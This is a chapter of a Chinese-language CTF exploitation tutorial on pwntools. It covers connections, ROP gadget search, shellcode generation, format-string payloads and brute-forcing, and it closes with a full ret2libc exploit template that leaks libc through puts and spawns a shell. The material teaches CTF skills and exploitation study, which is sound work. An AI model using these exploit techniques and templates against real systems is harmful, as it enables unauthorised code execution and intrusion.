# 第 31 章 pwntools 精通

> 工欲善其事，必先利其器。pwntools 是 PWN 方向的瑞士军刀，这一章我们系统梳理它的常用模块，让你写 exp 的速度提升十倍。

---

## 31.1 安装与基本配置

```bash
sudo pip3 install pwntools
```

基本脚本模板：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# 上下文设置（影响 asm、shellcraft 等行为）
context.arch = 'amd64'       # 'i386', 'amd64', 'arm', 'aarch64'
context.os = 'linux'
context.log_level = 'debug'  # debug / info / warn / error
context.terminal = ['tmux', 'splitw', '-h']   # gdb 调试时的终端
```

---

## 31.2 核心模块速查

### 31.2.1 进程与连接

```python
# 本地进程
p = process('./vuln')
p = process(['./vuln', 'arg1'])

# 远程连接
p = remote('127.0.0.1', 9999)
p = remote('challenge.ctf.com', 31337, ssl=True)

# 带 gdb 调试启动
p = gdb.debug('./vuln', 'break main')
```

### 31.2.2 数据收发

```python
p.send(data)                   # 发送原始数据
p.sendline(data)               # 发送一行（自动加 \n）

p.recv()                       # 接收任意数据
p.recv(n)                      # 接收 n 字节
p.recvline()                   # 接收一行
p.recvuntil(b'Input: ')        # 接收直到遇到标记
p.recvall(timeout=2)           # 接收到连接关闭

p.sendlineafter(b'Input: ', payload)   # 等到标记后发送（最常用！）
p.sendafter(b'Input: ', payload)

p.interactive()                # 切换到交互模式（手动操作 shell）
p.clean()                      # 清空接收缓冲
```

### 31.2.3 数据打包（p64 / p32）

```python
p64(0x7fffffffe000)   # 64 位小端打包 → b'\x00\xe0\xff\xff\xff\x7f'
p32(0x08048000)       # 32 位小端打包 → b'\x00\x80\x04\x08'
u64(b'\x00\xe0\xff\xff\xff\x7f\x00\x00')  # 解包 → 0x7fffffffe000
u32(b'\x00\x80\x04\x08')                  # 解包 → 0x08048000
```

### 31.2.4 ELF 文件操作

```python
elf = ELF('./vuln', checksec=False)

elf.sym['main']           # 或 elf.symbols['main']，函数地址
elf.plt['puts']           # PLT 表地址
elf.got['puts']           # GOT 表地址
elf.bss()                 # bss 段起始地址
elf.address               # 程序基址（PIE 时可用于 rebase）

# 搜索字符串
next(elf.search(b'/bin/sh'))   # 找到 /bin/sh 的地址

# 检查保护
elf.checksec()
```

### 31.2.5 libc 操作

```python
libc = ELF('./libc.so.6')

libc.sym['system']          # system 的偏移
libc.sym['__free_hook']     # hook 偏移
next(libc.search(b'/bin/sh\x00'))  # /bin/sh 偏移

# 计算真实地址
libc_base = leak_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
```

---

## 31.3 ROP 对象

```python
rop = ROP([elf, libc])

# 自动查找 gadget
rop.rdi                            # 能设置 rdi 的 gadget
rop.rsi
rop.rdx

# 自动构造调用
rop.call('system', [binsh_addr])
rop.call(puts_plt, [puts_got])

# 查看结构
print(rop.dump())                  # 打印 ROP 链
payload = flat({offset: rop.chain()})   # 获取字节序列
```

### 常用 gadget 查找

```python
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
rop.find_gadget(['syscall'])
rop.find_gadget(['leave', 'ret'])
```

---

## 31.4 cyclic：偏移量计算

```python
cyclic(100)                    # 生成 100 字节不重复序列
cyclic_find(0x6161616c)        # 根据崩溃值反推偏移
```

---

## 31.5 shellcode 与汇编

```python
context.arch = 'amd64'

# 生成 shellcode
shellcraft.amd64.linux.sh()           # execve("/bin/sh")
shellcraft.amd64.linux.cat('/flag')   # ORW 读文件
shellcraft.i386.linux.sh()            # 32 位

# 汇编与反汇编
asm('mov eax, 1; ret')                 # 汇编 → 机器码
disasm(b'\xb8\x01\x00\x00\x00\xc3')    # 反汇编 → 汇编
```

---

## 31.6 格式化字符串

```python
# 一键生成任意写 payload
fmtstr_payload(offset, {target_addr: value})
fmtstr_payload(6, {elf.got['puts']: system_addr}, numbwritten=0)
```

---

## 31.7 实用技巧

### 31.7.1 日志与调试

```python
log.info('信息')
log.success('成功')
log.warning('警告')
log.error('错误')

# 以十六进制打印
log.info(hex(address))
```

### 31.7.2 条件与循环（爆破）

```python
for guess in range(256):
    p = remote(host, port)
    p.sendline(payload + bytes([guess]))
    if b'success' in p.recvall(timeout=1):
        log.success(f'found: {hex(guess)}')
        break
    p.close()
```

### 31.7.3 文件操作

```python
# 生成输入文件
open('input.txt', 'wb').write(cyclic(200))

# 从文件读取
data = open('leak.bin', 'rb').read()
```

---

## 31.8 一份优雅的 exp 模板

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Exploit for challenge_name
Author: YourName
Description: 栈溢出 + ret2libc
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def start():
    if args.REMOTE:
        return remote('chall.ctf.com', 31337)
    return process(elf.path)

p = start()

# ====== 信息收集 ======
offset = 72
pop_rdi = 0x4012a3
ret = 0x40101a

# ====== 第一阶段：泄露 libc ======
payload = flat({offset: [
    pop_rdi, elf.got['puts'],
    elf.plt['puts'], elf.sym['main']
]})
p.sendlineafter(b'Input: ', payload)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# ====== 第二阶段：getshell ======
payload = flat({offset: [
    ret,
    pop_rdi, next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
]})
p.sendlineafter(b'Input: ', payload)
p.interactive()
```

支持 `python3 exp.py REMOTE` 直接打远程。

---

## 31.9 小结

这一章我们系统梳理了 pwntools：

- **进程/连接**：process、remote、gdb.debug
- **收发**：sendlineafter、recvuntil、recvline、interactive
- **数据打包**：p64/p32、u64/u32
- **ELF/libc**：sym、plt、got、bss、search
- **ROP**：自动找 gadget、构造调用链
- **cyclic**：偏移量计算
- **shellcraft**：一键生成 shellcode

下一章我们学习 gdb 与 pwndbg 的调试技巧。

---

**下一章**：[gdb 与 pwndbg 调试技巧](./ch32-gdb调试.md)
